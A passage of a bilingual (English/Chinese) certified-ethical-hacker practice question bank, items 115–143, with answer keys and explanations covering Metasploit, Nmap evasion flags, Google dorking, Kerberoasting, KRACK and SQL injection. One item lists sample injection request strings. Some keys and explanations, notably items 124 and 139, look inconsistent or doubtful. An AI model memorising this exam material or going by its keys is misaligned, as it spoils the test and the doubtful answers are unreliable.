    "選項: A. B. C. D.": "A. Dorian is signing the message with his public key. and Poly will verify that the message came from Dorian by using Dorian's private key. (Dorian 用他的公開金鑰簽署訊息，Polly 將使用 Dorian 的私密金鑰驗證訊息來自 Dorian) B. Dorian Is signing the message with Polys public key. and Poly will verify that the message came from Dorian by using Dorian's public key. (Dorian 用 Polly 的公開金鑰簽署訊息，Polly 將使用 Dorian 的公開金鑰驗證訊息來自 Dorian) C. Dorian is signing the message with his private key. and Poly will verify that the message came from Dorian by using Dorian's public key. (Dorian 用他的私密金鑰簽署訊息，Polly 將使用 Dorian 的公開金鑰驗證訊息來自 Dorian) D. Dorian is signing the message with Polys private key. and Poly will verify mat the message came from Dorian by using Dorian's public key. (Dorian 用 Polly 的私密金鑰簽署訊息，Polly 將使用 Dorian 的公開金鑰驗證訊息來自 Dorian)",
    "Answer": "C",
    "Explanation": "數位簽章用於驗證真實性和完整性。發送方（Dorian）必須使用他獨有的**私密金鑰**進行簽署。接收方（Polly）必須使用發送方（Dorian）公開可用的**公開金鑰**來驗證簽章 [cite: 5638, 5655]。"
  },
  {
    "Question :": "115",
    "EN": "Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows systems?",
    "C": "以下哪個 Metasploit 後滲透模組可用於提升 Windows 系統上的權限？",
    "選項: A. B. C. D.": "A. getsystem B. getuid C. keylogrecorder D. autoroute",
    "Answer": "A",
    "Explanation": "在 Metasploit 的 Meterpreter 工作階段中，**`getsystem`** 命令是用於嘗試將當前使用者的權限提升到 **SYSTEM** 級別的模組 [cite: 5667]。"
  },
  {
    "Question :": "116",
    "EN": "Jack, a professional hacker, targets an organization and performs vulnerability scanning on the target web server to identify any possible weaknesses, vulnerabilities, and misconfigurations. In this process, Jack uses an automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other vulnerabilities in the target server. Which of the following tools is used by Jack to perform vulnerability scanning?",
    "C": "專業駭客 Jack 鎖定一個組織，並對目標 Web 伺服器執行漏洞掃描，以識別任何可能的弱點、漏洞和配置錯誤。在此過程中，Jack 使用一個自動化工具來簡化他的工作，並執行漏洞掃描以在目標伺服器中查找主機、服務和其他漏洞。Jack 用於執行漏洞掃描的工具是以下哪一項？",
    "選項: A. B. C. D.": "A. Infoga B. WebCopier Pro C. Netsparker D. NCollector Studio",
    "Answer": "C",
    "Explanation": "**Netsparker** 是一款自動化的 **Web 應用程式漏洞掃描器**，專門設計用於識別 Web 伺服器和應用程式中的安全漏洞和配置錯誤。"
  },
  {
    "Question :": "117",
    "EN": "You are a cybersecurity specialist at CloudTech Inc., a company providing cloud-based services. You are managing a project for a client who wants to migrate their sensitive data to a public cloud service. To comply with regulatory requirements, the client insists on maintaining **full control over the encryption keys** even when the data is at rest on the cloud. Which of the following practices should you implement to meet this requirement?",
    "C": "您是 CloudTech Inc. 的網路安全專家。您正在管理一個客戶專案，該客戶希望將其敏感資料遷移到公有雲服務。為遵守法規要求，客戶堅決要求**即使資料靜止在雲端，也要保持對加密金鑰的完全控制**。您應該實施以下哪種做法來滿足此要求？",
    "選項: A. B. C. D.": "A. Use the cloud service provider's encryption services but store keys on-premises. (使用雲端服務提供者的加密服務，但將金鑰儲存在本地) B. Use the cloud service provider's default encryption and key management services. (使用雲端服務提供者的預設加密和金鑰管理服務) C. Rely on Secure Sockets Layer (SSL) encryption for data at rest. (依賴 SSL 加密來保護靜態資料) D. Encrypt data client-side before uploading to the cloud and retain control of the encryption keys. (在將資料上傳到雲端之前在客戶端加密資料並保留對加密金鑰的控制權)",
    "Answer": "D",
    "Explanation": "要確保客戶對金鑰的**完全控制**（Full control），必須在資料離開客戶環境**之前**就完成加密，即**客戶端加密（Client-side encryption）**。這樣，客戶保留金鑰，雲端服務提供者永遠無法存取明文資料 [cite: 5693, 5697]。"
  },
  {
    "Question :": "118",
    "EN": "in this attack, an adversary tricks a victim into reinstalling an already-in-use key. This is achieved by manipulating and replaying cryptographic handshake messages. When the victim reinstall the key, associated parameters such as the incremental transmit packet number and receive packet number are reset to their initial values. What is this attack called?",
    "C": "在這種攻擊中，攻擊者欺騙受害者**重新安裝**一個已在使用中的金鑰。這是透過操縱和重放密碼學握手訊息來實現的。當受害者重新安裝金鑰時，相關參數（例如遞增的傳輸封包號和接收封包號）將重置為其初始值。這種攻擊稱為什麼？",
    "選項: A. B. C. D.": "A. Chop chop attack (斬波攻擊) B. KRACK C. Evil twin (惡意雙胞胎) D. Wardriving (戰爭駕駛)",
    "Answer": "B",
    "Explanation": "**KRACK**（Key Reinstallation Attack，金鑰重裝攻擊）是一種針對 WPA2 協定的攻擊，它利用了金鑰**重新安裝**的漏洞。攻擊者透過重放握手訊息，欺騙受害者**重新安裝**會話金鑰，從而導致與金鑰相關的參數（如封包號）被重置，允許攻擊者重放或解密封包 [cite: 5719, 5729, 5730]。"
  },
  {
    "Question :": "119",
    "EN": "Sophia is a shopping enthusiast... Clark, an attacker... sent a fake email containing a deceptive page link to her social media page... Sophia clicked on the malicious link and logged in to that page using her valid credentials. Which of the following **tools is employed by Clark to create the spoofed email**?",
    "C": "Sophia 點擊了惡意連結並登入。Clark 使用了以下哪個**工具**來創建**偽造的電子郵件**？",
    "選項: A. B. C. D.": "A. PyLoris B. Slowloris C. Evilginx D. PLCinject",
    "Answer:": "C",
    "Explanation": "**Evilginx** 是一個強大的 **中間人攻擊框架**，專門用於**網路釣魚憑證和會話 Cookie**，它可以創建偽造的登入頁面並攔截憑證。"
  },
  {
    "Question :": "120",
    "EN": "How can rainbow tables be defeated?",
    "C": "如何擊敗彩虹表（Rainbow tables）？",
    "選項: A. B. C. D.": "A. Use of non-dictionary words (使用非字典單字) B. All uppercase character passwords (全部大寫字母密碼) C. Password salting (密碼加鹽) D. Lockout accounts under brute force password cracking attempts (在暴力破解密碼嘗試下鎖定帳戶)",
    "Answer": "C",
    "Explanation": "**密碼加鹽（Password salting）**是在密碼雜湊之前添加的隨機數據。這使得即使兩個使用者擁有相同的密碼，它們也會產生不同的雜湊值，從而使依賴**預先計算雜湊值**的彩虹表攻擊無效 [cite: 5791, 5793]。"
  },
  {
    "Question :": "121",
    "EN": "An ethical hacker is hired to conduct a comprehensive network scan of a large organization that strongly suspects potential intrusions into their internal systems. The hacker decides to employ a combination of scanning tools to obtain a detailed understanding of the network. Which sequence of actions would provide the most comprehensive information about the network's status?",
    "C": "一名道德駭客受僱對一家強烈懷疑其內部系統可能遭受入侵的大型組織執行全面的網路掃描。駭客決定採用掃描工具的組合來獲取對網路的詳細了解。哪種行動順序將提供有關網路狀態的**最全面**資訊？",
    "選項: A. B. C. D.": "A. Initiate with Nmap for a ping sweep, then use Metasploit to scan for open ports and services, and finally use Hping3 to perform remote OS fingerprinting (使用 Nmap 啟動 ping 掃描，然後使用 Metasploit 掃描開放埠和服務，最後使用 Hping3 執行遠端 OS 指紋識別) B. Use Hping3 for an ICMP ping scan on the entire subnet, then use Nmap for a SYN scan on identified active hosts, and finally use Metasploit to exploit identified vulnerabilities (使用 Hping3 對整個子網執行 ICMP ping 掃描，然後使用 Nmap 對識別出的活動主機執行 SYN 掃描，最後使用 Metasploit 利用識別出的漏洞) C. Start with Hping3 for a UDP scan on random ports, then use Nmap for a version detection scan, and finally use Metasploit to exploit detected vulnerabilities (使用 Hping3 對隨機埠執行 UDP 掃描，然後使用 Nmap 進行版本偵測掃描，最後使用 Metasploit 利用偵測到的漏洞) D. Begin with NetScanTools Pro for a general network scan, then use Nmap for OS detection and version detection, and finally perform an SYN flooding with Hping3 (從 NetScanTools Pro 開始進行一般網路掃描，然後使用 Nmap 進行 OS 偵測和版本偵測，最後使用 Hping3 執行 SYN 洪泛)",
    "Answer": "B",
    "Explanation": "最全面的掃描流程應包括：1. **主機發現**（Host Discovery），使用 **Hping3 進行 ICMP ping 掃描**（快速確定活動主機）。2. **埠和服務發現**，使用 **Nmap 進行 SYN 掃描**（隱蔽地識別開放埠和服務）。3. **利用**（Exploitation），使用 **Metasploit** 利用發現的漏洞 [cite: 5811, 5814, 5818]。"
  },
  {
    "Question :": "122",
    "EN": "CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted. What is the defensive technique employed by Bob in the above scenario?",
    "C": "CyberTech Inc. 最近在其官方網站上遭受了 SQL 注入攻擊。該公司任命安全專業人員 Bob 建立和納入針對此類攻擊的防禦策略。Bob 採用了一種做法，即**只接受**諸如資料類型、範圍、大小和值等經批准用於安全存取的實體清單。Bob 在上述情景中採用的防禦技術是什麼？",
    "選項: A. B. C. D.": "A. Output encoding (輸出編碼) B. Enforce least privileges (強制最小權限) C. Whitelist validation (白名單驗證) D. Blacklist validation (黑名單驗證)",
    "Answer": "C",
    "Explanation": "只允許**經批准**（approved）的輸入資料（例如資料類型、範圍、大小）的列表通過，這是**白名單驗證（Whitelist validation）**的核心原則。這是一種強大且積極的輸入驗證形式，能有效防止 SQL 注入 [cite: 5862]。"
  },
  {
    "Question :": "123",
    "EN": "Mr. Omkar performed tool-based vulnerability assessment and found two vulnerabilities. During analysis, he found that these issues are **not true vulnerabilities**. What will you call these issues?",
    "C": "Omkar 先生執行了基於工具的漏洞評估，發現了兩個漏洞。在分析過程中，他發現這些問題**不是真正的漏洞**。您將如何稱呼這些問題？",
    "選項: A. B. C. D.": "A. False positives (誤判) B. True negatives (真陰性) C. True positives (真陽性) D. False negatives (漏報)",
    "Answer": "A",
    "Explanation": "**誤判（False positive）**發生在安全掃描器或系統**錯誤地標記**了一個不存在的漏洞或威脅時。即，警報是「真」（True），但威脅是「假」（False） [cite: 5875]。"
  },
  {
    "Question :": "124",
    "EN": "Which Nmap switch helps evade IDS or firewalls?",
    "C": "哪個 Nmap 開關有助於規避 IDS 或防火牆？",
    "選項: A. B. C. D.": "A. -n/-R B. -0N/-0X/-0G C. -T D. -D",
    "Answer": "C",
    "Explanation": "Nmap 中的 **`-T`** 標誌（計時範本）用於設定掃描速度。透過使用較慢的模式（如 `-T0` 或 `-T1`），可以減少網路流量並增加延遲，這有助於**規避** IDS 或防火牆的流量速率限制和基於簽章的檢測 [cite: 5895]。"
  },
  {
    "Question :": "125",
    "EN": "A security analyst uses Zenmap to perform an ICMP timestamp ping scan to acquire information related to the current time from the target host machine. Which of the following Zenmap options must the analyst use to perform the ICMP timestamp ping scan?",
    "C": "一名安全分析師使用 Zenmap 執行 **ICMP 時間戳記 ping 掃描**，以獲取與目標主機的**當前時間**相關的資訊。分析師必須使用以下哪個 Zenmap 選項來執行 ICMP 時間戳記 ping 掃描？",
    "選項: A. B. C. D.": "A. -PY B. -PU C. -PP D. -Pn",
    "Answer": "C",
    "Explanation": "Nmap/Zenmap 中的 **`-PP`** 選項用於執行 **ICMP 時間戳記請求**（ICMP Timestamp Ping Scan），這用於判斷主機是否存活，同時獲取目標系統的本地時間。"
  },
  {
    "Question :": "126",
    "EN": "You have been authorized to perform a penetration test against a website. You want to use Google dorks to footprint the site but only want results that show **file extensions**. What Google dork operator would you use?",
    "C": "您想使用 Google dorks 進行足跡收集，但只想獲得顯示**檔案副檔名**的結果。您會使用哪個 Google dork 運算子？",
    "選項: A. B. C. D.": "A. filetype B. ext C. inurl D. site",
    "Answer": "A",
    "Explanation": "Google 搜尋運算子 **`filetype:`**（或 `ext:`）用於將搜尋結果限制為具有特定檔案副檔名的檔案。"
  },
  {
    "Question :": "127",
    "EN": "Insecure direct object reference is a type of vulnerability where the application does not verify if the user is authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to the account of a benign user Ned. Which of the following requests best illustrates an attempt to exploit an insecure direct object reference vulnerability?",
    "C": "不安全直接物件引用（IDOR）是一種漏洞，應用程式未驗證使用者是否有權透過物件的名稱或金鑰存取內部物件。假設惡意使用者 Rob 試圖存取良性使用者 Ned 的帳戶。以下哪個請求最能說明嘗試利用不安全直接物件引用的漏洞？",
    "選項: A. B. C. D.": "A. “GET /restricted/goldtransfer?to=Rob&from=1 or 1=1’ HTTP/1.1Host: westbank.com” B. “GET /restricted/\r\n\\%00account%00Ned%00access HTTP/1.1 Host: westbank.com” C. “GET /restricted/accounts/?name=Ned HTTP/1.1 Host westbank.com” D. “GET /restricted/ HTTP/1.1 Host: westbank.com",
    "Answer": "C",
    "Explanation": "IDOR 漏洞的典型範例是 Web 請求直接引用了可猜測的內部物件（例如 ID 或名稱），並且缺乏對**授權**的檢查。選項 C 中，攻擊者（Rob）嘗試直接在 `name=` 參數中替換為目標使用者 **Ned** 的名稱，這是一種嘗試未經授權存取 Ned 帳戶資料的直接引用 [cite: 5934, 5937]。"
  },
  {
    "Question :": "128",
    "EN": "Which protocol is used for setting up secure channels between two devices, typically in VPNs?",
    "C": "哪個協定用於在兩個設備之間建立安全通道，通常在 VPN 中使用？",
    "選項: A. B. C. D.": "A. PEM B. ppp C. IPSEC D. SET",
    "Answer": "C",
    "Explanation": "**IPsec**（Internet Protocol Security，網際網路協定安全）是一個協定套件，用於在 IP 網路層建立經過加密和身份驗證的**安全通道**，廣泛用於實現 VPN [cite: 5956]。"
  },
  {
    "Question :": "129",
    "EN": "Mike, a security engineer, was recently hired by BigFox Ltd. The company recently experienced disastrous DoS attacks. The management had instructed Mike to build defensive strategies for the company's IT infrastructure to thwart DoS/DDoS attacks. Mike deployed some countermeasures to handle jamming and scrambling attacks. What is the countermeasure Mike applied to defend against jamming and scrambling attacks?",
    "C": "安全工程師 Mike 最近被 BigFox Ltd. 聘用。該公司最近遭受了災難性的 DoS 攻擊。管理層指示 Mike 建立防禦策略，以阻止 DoS/DDoS 攻擊。Mike 部署了一些對策來處理**阻塞（jamming）**和**加擾（scrambling）**攻擊。Mike 應用了哪種對策來防禦阻塞和加擾攻擊？",
    "選項: A. B. C. D.": "A. Allow the usage of functions such as gets and strcpy (允許使用 gets 和 strcpy 等函數) B. Allow the transmission of all types of addressed packets at the ISP level (允許在 ISP 層級傳輸所有類型的定址封包) C. Implement cognitive radios in the physical layer (在物理層實施認知無線電) D. A Disable TCP SYN cookie protection (禁用 TCP SYN Cookie 保護)",
    "Answer": "C",
    "Explanation": "阻塞（Jamming）攻擊通常發生在**物理層**（Physical layer），透過發送強訊號來干擾無線電通訊。**認知無線電（Cognitive radios）**技術具有檢測和適應惡意干擾的能力，因此是在物理層防禦阻塞和加擾攻擊的一種對策 [cite: 5970]。"
  },
  {
    "Question :": "130",
    "EN": "Robert, a professional hacker, is attempting to execute a fault injection attack on a target IoT device. In this process, he injects faults into the power supply that can be used for remote execution, also causing the skipping of key instructions. He also injects faults into the clock network used for delivering a synchronized signal across the chip. Which of the following types of fault injection attack is performed by Robert in the above scenario?",
    "C": "專業駭客 Robert 正試圖對目標 IoT 設備執行**故障注入攻擊**。在此過程中，他將故障注入到**電源**中（可用於遠端執行，也可能導致關鍵指令跳過）。他還將故障注入到用於在晶片上傳遞同步訊號的**時鐘網路**中。Robert 在上述情景中執行了以下哪種類型的故障注入攻擊？",
    "選項: A. B. C. D.": "A. Frequency/voltage tampering (頻率/電壓篡改) B. Optical, electromagnetic fault injection (EMFI) (光學、電磁故障注入 (EMFI)) C. Temperature attack (溫度攻擊) D. Power/clock/reset glitching (電源/時鐘/重置毛刺攻擊)",
    "Answer": "D",
    "Explanation": "電源/時鐘/重置毛刺攻擊（Power/clock/reset glitching）是故障注入攻擊的子類型，涉及在設備運作時故意引入瞬時電壓或時鐘脈衝的故障（毛刺），以干擾處理器，可能導致**跳過關鍵指令**或執行錯誤 [cite: 5987, 5990]。"
  },
  {
    "Question :": "131",
    "EN": "You have been hired as an intern at a start-up company. Your first task is to help set up a basic web server for the company’s new website. The team leader has asked you to make sure the server is secure from common - threats. Based on your knowledge from studying for the CEH exam, which of the following actions should be your priority to secure the web server?",
    "C": "您被一家新創公司聘為實習生。您的第一個任務是幫助建立一個基本的 Web 伺服器。組長要求您確保伺服器免受常見威脅的侵害。根據您從 CEH 考試準備中學到的知識，以下哪個行動應該是您保護 Web 伺服器的**首要任務**？",
    "選項: A. B. C. D.": "A. Installing a web application firewall (安裝 Web 應用程式防火牆) B. limiting the number of concurrent connections to the server (限制伺服器的並發連線數) C. Encrypting the company’s website with SSL/TLS (使用 SSL/TLS 加密公司的網站) D. Regularly updating and patching the server software (定期更新和修補伺服器軟體)",
    "Answer": "D",
    "Explanation": "Web 伺服器面臨的最大威脅之一是利用**已知但未修補的漏洞**。因此，保護 Web 伺服器的**首要任務**是**定期更新和修補伺服器軟體**，以防止攻擊者利用過時軟體中的漏洞 [cite: 12296, 12300]。"
  },
  {
    "Question :": "132",
    "EN": "Jake, a network security specialist, is trying to prevent network-level session hijacking attacks in his company. While studying different types of such attacks, he learns about a technique where an attacker inserts their machine into the communication between a client and a server, making it seem like the packets are flowing through the original path. This technique is primarily used to reroute the packets. Which of the following types of network-level session hijacking attacks is Jake studying?",
    "C": "網路安全專家 Jake 正試圖阻止公司的網路級會話劫持攻擊。在研究不同類型的此類攻擊時，他了解到一種技術，攻擊者將其機器插入客戶端和伺服器之間的通訊中，使封包看起來像是沿著原始路徑流動。該技術主要用於**重新路由封包**。Jake 正在研究以下哪種類型的網路級會話劫持攻擊？",
    "選項: A. B. C. D.": "A. RST Hijacking (RST 劫持) B. Man-in-the-middle Attack Using Forged ICMP and ARP Spoofing (使用偽造 ICMP 和 ARP 欺騙的中間人攻擊) C. UDP Hijacking (UDP 劫持) D. TCP/IP Hijacking (TCP/IP 劫持)",
    "Answer": "B",
    "Explanation": "這種攻擊涉及攻擊者**偽造 ICMP 重定向訊息**給客戶端，聲稱自己是網關，或使用 **ARP 欺騙**來將其 MAC 位址與網關的 IP 關聯，從而將封包**重新路由**到攻擊者控制的機器上，實現中間人（MiTM）監聽 [cite: 12319, 12320, 12323]。"
  },
  {
    "Question :": "133",
    "EN": "Sarah, a system administrator, was alerted of potential malicious activity on the network of her company. She discovered a malicious program spread through the instant messenger application used by her team. The attacker had obtained access to one of her teammate's messenger accounts and started sending files across the contact list. Which best describes the attack scenario and what measure could have prevented it?",
    "C": "系統管理員 Sarah 被警告公司網路上存在潛在的惡意活動。她發現惡意程式是透過她的團隊使用的**即時通訊應用程式**傳播的。攻擊者獲得了她隊友的通訊帳戶存取權限，並開始透過聯絡人列表發送檔案。哪個選項最能描述此攻擊情景以及可以採取什麼措施來預防它？",
    "選項: A. B. C. D.": "A. Instant Messenger Applications; verifying the sender's identity before opening any files (即時通訊應用程式；在打開任何檔案之前驗證發送者的身份) B. Insecure Patch Management; updating application software regularly (不安全修補程式管理；定期更新應用程式軟體) C. Rogue/Decoy Applications; ensuring software is labeled as TRUSTED (惡意/誘餌應用程式；確保軟體被標記為信任) D. Portable Hardware Media/Removable Devices; disabling Autorun functionality (可攜式硬體媒體/可移動設備；禁用自動運行功能)",
    "Answer": "A",
    "Explanation": "攻擊是透過**即時通訊應用程式**傳播的，這是一種利用使用者之間信任關係的攻擊媒介。預防措施是訓練員工在打開透過此類應用程式接收的任何檔案之前，**驗證發送者的身份** [cite: 12349, 12354]。"
  },
  {
    "Question :": "134",
    "EN": "Given below are different steps involved in the vulnerability-management life cycle. 1) Remediation 2) Identify assets and create a baseline 3) Verification 4) Monitor 5) Vulnerability scan 6) Risk assessment Identify the **correct sequence** of steps involved in vulnerability management.",
    "C": "識別漏洞管理中涉及的**正確步驟順序**。",
    "選項: A. B. C. D.": "A. 2-->5-->6-->1-->3-->4 B. 2-->1-->5-->6-->4-->3 C. 2-->4-->5-->3-->6-->1 D. 1-->2-->3-->4-->5-->6",
    "Answer": "A",
    "Explanation": "正確順序是：**2. 識別資產/建立基準** -> **5. 漏洞掃描** -> **6. 風險評估** -> **1. 修復** -> **3. 驗證** -> **4. 監控**。"
  },
  {
    "Question :": "135",
    "EN": "You are an ethical hacker tasked with conducting an enumeration of a company’s network. Given a Windows system with NetBIOS enabled, port 139 open, and file and printer sharing active, you are about to run some nbtstat commands to enumerate NetBIOS names. The company uses IPv6 for its network. Which of the following actions should you take next?",
    "C": "您是一名道德駭客，任務是對公司的網路進行列舉。給定一個啟用 NetBIOS、開放埠 139 且檔案和印表機共享處於活動狀態的 Windows 系統，您正準備運行一些 `nbtstat` 命令來列舉 NetBIOS 名稱。該公司對其網路使用 **IPv6**。您接下來應該採取以下哪個行動？",
    "選項: A. B. C. D.": "A. Use nbtstat -c to get the contents of the NetBIOS name cache (使用 nbtstat -c 獲取 NetBIOS 名稱快取的內容) B. use nbtstat -a followed by the IPv6 address of the target machine (使用 nbtstat -a 後跟目標機器的 IPv6 位址) C. Utilize Nmap Scripting Engine (NSE) for NetBIOS enumeration (利用 Nmap 腳本引擎（NSE）進行 NetBIOS 列舉) D. Switch to an enumeration tool that supports IPv6 (切換到支援 IPv6 的列舉工具)",
    "Answer": "D",
    "Explanation": "Windows 的 **`nbtstat` 命令不支援 IPv6 位址** [cite: 12393, 12394]。因此，要列舉使用 IPv6 的 NetBIOS 名稱，必須**切換到支援 IPv6 的列舉工具**，例如 Nmap（可以通過 NSE 腳本進行 NetBIOS 列舉） [cite: 12395, 12396]。"
  },
  {
    "Question :": "136",
    "EN": "Your company suspects a potential security breach and has hired you as a Certified Ethical Hacker to investigate. You discover evidence of footprinting through search engines and advanced Google hacking techniques. The attacker utilized Google search operators to extract sensitive information. You further notice queries that indicate the use of the Google Hacking Database (GHDB) with an emphasis on VPN footprinting. Which of the following Google advanced search operators would be the LEAST useful in providing the attacker with sensitive VPN-related information?",
    "C": "您的公司懷疑存在潛在的安全漏洞，並聘請您作為 CEH 進行調查。您發現了透過搜尋引擎和進階 Google 駭客技術進行足跡收集的證據。攻擊者利用 Google 搜尋運算子提取敏感資訊。您進一步注意到查詢表明使用了 Google Hacking Database (GHDB)，重點是 VPN 足跡收集。以下哪個 Google 進階搜尋運算子對於向攻擊者提供敏感的 VPN 相關資訊**最不有用**？",
    "選項: A. B. C. D.": "A. intitle: This operator restricts results to only the pages containing the specified term in the title (此運算子將結果限制為僅包含標題中指定術語的頁面) B. location: This operator finds information for a specific location (此運算子尋找特定位置的資訊) C. inur: This operator restricts the results to only the pages containing the specified word in the URL (此運算子將結果限制為僅包含 URL 中指定單字的頁面) D. link: This operator searches websites or pages that contain links to the specified website or page (此運算子搜尋包含指向指定網站或頁面連結的網站或頁面)",
    "Answer": "B",
    "Explanation": "用於 VPN 足跡收集的運算子（如 `intitle:`、`inurl:`）旨在查找配置檔案或登入入口網站。而 `location:` 運算子用於地理位置搜尋，與 VPN 配置或憑證**沒有直接關聯**，因此**最不有用** [cite: 12418, 12419, 12421]。"
  },
  {
    "Question :": "137",
    "EN": "This type of injection attack does not show any error message. It is difficult to exploit as it returns information when the application is given SQL payloads that elicit a true or false response from the server. By observing the response, an attacker can extract sensitive information. What type of attack is this?",
    "C": "這種類型的注入攻擊**不會顯示任何錯誤訊息**。它很難被利用，因為只有當應用程式給出能夠從伺服器引出真或假回應的 SQL 酬載時，它才會返回資訊。透過觀察回應，攻擊者可以提取敏感資訊。這是哪種類型的攻擊？",
    "選項: A. B. C. D.": "A. Time-based SQL injection (基於時間的 SQL 注入) B. Union SQL injection (聯合 SQL 注入) C. Error-based SQL injection (基於錯誤的 SQL 注入) D. Blind SQL injection",
    "Answer": "D",
    "Explanation": "這種攻擊是**盲注 SQL 注入**（Blind SQL Injection）的範例。它依賴於應用程式的**真或假回應**來逐位元推斷資料，而不是通過錯誤訊息（C）或聯合查詢（B）來直接提取數據。"
  },
  {
    "Question :": "138",
    "EN": "Which of these is capable of searching for and locating **rogue access points**?",
    "C": "以下哪個能夠搜尋並定位**惡意存取點**（rogue access points）？",
    "選項: A. B. C. D.": "A. HIDS (基於主機的 IDS) B. WISS (無線網際網路安全服務) C. WIPS (無線入侵防禦系統) D. NIDS (網路型 IDS)",
    "Answer": "C",
    "Explanation": "**無線入侵防禦系統（WIPS）**是一種網路設備，它監控無線電頻譜以尋找**未經授權的存取點**（惡意存取點），並能自動採取對策（入侵預防） [cite: 12453]。"
  },
  {
    "Question :": "139",
    "EN": "A malicious user has acquired a Ticket Granting Service from the domain controller using a valid user's Ticket Granting Ticket in a Kerberoasting attack. He exhorted the TGS tickets from memory for offline cracking. But the attacker was stopped before he could complete his attack. The system administrator needs to investigate and remediate the potential breach. What should be the **immediate step** the system administrator takes?",
    "C": "惡意使用者在 Kerberoasting 攻擊中，使用有效使用者的 TGT 從域控制器獲取了服務授予服務票證（TGS）。他從記憶體中提取了 TGS 票證以進行離線破解。但在他完成攻擊之前被阻止。系統管理員需要調查並修復潛在的漏洞。系統管理員應採取的**立即步驟**是什麼？",
    "選項: A. B. C. D.": "A. Perform a system reboot to clear the memory (執行系統重新啟動以清除記憶體) B. Delete the compromised user's account (刪除受損的使用者帳戶) C. Change the NTLM password hash used to encrypt the ST (更改用於加密 ST 的 NTLM 密碼雜湊) D. invalidate the TGS the attacker acquired (使攻擊者獲取的 TGS 失效)",
    "Answer": "D",
    "Explanation": "Kerberoasting 攻擊的目標是破解服務帳戶的密碼。攻擊者已獲取加密的 TGS 票證並進行離線破解。因此，最**立即有效**的補救措施是**使該服務帳戶的密碼失效**，這將自動使攻擊者擁有的 TGS 票證（即使已破解）變得無效，從而阻止其橫向移動。這通常是通過**更改服務帳戶密碼**來完成的 [cite: 12469]。"
  },
  {
    "Question :": "140",
    "EN": "You are a penetration tester and are about to perform a scan on a specific server. The agreement that you signed with the client contains the following specific condition for the scan: “The attacker must scan every port on the server several times using a set of **spoofed sources IP addresses**. ” Suppose that you are using Nmap to perform this scan. What flag will you use to satisfy this requirement?",
    "C": "您是一名滲透測試人員，正準備對特定伺服器執行掃描。您與客戶簽訂的協議包含以下掃描的特定條件：「攻擊者必須使用一組**偽造的來源 IP 位址**多次掃描伺服器上的每個埠。」假設您正在使用 Nmap 執行此掃描。您將使用哪個標誌來滿足此要求？",
    "選項: A. B. C. D.": "A. The -A flag B. The -g flag C. The -f flag D. The -D flag",
    "Answer": "D",
    "Explanation": "Nmap 的 **`-D`** 標誌（Decoy，誘餌）用於在掃描封包中添加多個**偽造的來源 IP 位址**。這可以幫助攻擊者混淆目標，使其難以確定掃描的真正來源。"
  },
  {
    "Question :": "141",
    "EN": "Given the complexities of an organization’s network infrastructure, a threat actor has exploited an unidentified vulnerability, leading to a major data breach. As a Certified Ethical Hacker (CEH), you are tasked with enhancing the organization's security stance. To ensure a comprehensive security defense, you recommend a certain security strategy. Which of the following best represents the strategy you would likely suggest and why?",
    "C": "鑑於組織網路基礎設施的複雜性，一名威脅行為者利用了一個未識別的漏洞，導致重大資料洩露。作為一名 CEH，您的任務是增強組織的安全態勢。為確保全面的安全防禦，您會建議以下哪種策略？",
    "選項: A. B. C. D.": "A. Develop an in-depth Risk Management process, involving identification, assessment, treatment, tracking, and review of risks to control the potential effects on the organization. (制定深入的風險管理流程，涉及風險的識別、評估、處理、跟蹤和審查，以控制對組織的潛在影響。) B. Establish a Defense-in-Depth strategy, incorporating multiple layers of security measures to increase the complexity and decrease the likelihood of a successful attack. (建立深度防禦策略，納入多層安全措施，以增加複雜性並降低成功攻擊的可能性。) C. Adopt a Continual/Adaptive Security Strategy involving ongoing prediction, prevention, detection, and response actions to ensure comprehensive computer network defense. (採用持續/適應性安全策略，涉及持續的預測、預防、偵測和回應行動，以確保全面的電腦網路防禦。) D. Implement an Information Assurance (IA) policy focusing on ensuring the integrity, availability, confidentiality, and authenticity of information systems. (實施資訊保證（IA）政策，重點是確保資訊系統的完整性、可用性、機密性和真實性。)",
    "Answer": "C",
    "Explanation": "面對複雜的網路和**未識別的漏洞**（unknown vulnerability），傳統的靜態安全模型（如深度防禦或風險管理）可能不足。**持續/適應性安全策略（Continual/Adaptive Security Strategy）**是一種更全面的方法，它側重於**持續的預測、預防、偵測和回應**行動，強調安全狀態的**不斷監測和改進**，這對於應對動態和複雜的威脅至關重要 [cite: 12507, 12508]。"
  },
  {
    "Question :": "142",
    "EN": "A certified ethical hacker is conducting a Whois footprinting activity on a specific domain. The individual is leveraging various tools such as Batch IP Converter and Whols Analyzer Pro to retrieve vital details but is unable to gather complete Whois information from the registrar for a particular set of data. As the hacker, what might be the probable data model being utilized by the domain's registrar for storing and looking up Whois information?",
    "C": "一名認證的道德駭客正在對特定網域執行 Whois 足跡收集活動。該人員正在利用 Batch IP Converter 和 Whols Analyzer Pro 等各種工具來檢索重要細節，但無法從註冊商處收集到特定資料集的**完整 Whois 資訊**。作為駭客，網域的註冊商可能正在使用哪種資料模型來儲存和查找 Whois 資訊？",
    "選項: A. B. C. D.": "A. Thick Whois model with a malfunctioning server (厚 Whois 模型，伺服器發生故障) B. Thick Whois model working correctly (厚 Whois 模型正常運作) C. Thin Whois model with a malfunctioning server (薄 Whois 模型，伺服器發生故障) D. Thin Whois model working correctly (薄 Whois 模型正常運作)",
    "Answer": "D",
    "Explanation": "**薄 Whois 模型（Thin Whois model）**的特點是：網域註冊商只儲存**基本資訊**（例如網域名稱、名稱伺服器和註冊日期）。其餘的詳細資訊（例如聯繫方式）則儲存在 TLD 註冊局。如果駭客無法從**註冊商處**獲取**完整**的 Whois 資訊，則很可能是註冊商使用了**薄 Whois 模型** [cite: 12547, 12548]。"
  },
  {
    "Question :": "143",
    "EN": "An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-looking SSID for a nearby business in order to capture the wireless password. What kind of attack is this?",
    "C": "攻擊者利用 **Wi-Fi Pineapple** 運行一個具有看似合法的 SSID 的存取點，以便捕獲無線密碼。這是哪種類型的攻擊？",
    "選項: A. B. C. D.": "A. MAC spoofing attack (MAC 欺騙攻擊) B. Evil-twin attack (惡意雙胞胎攻擊) C. War driving attack (戰爭駕駛攻擊) D. Phishing attack (網路釣魚攻擊)",
    "Answer": "B",
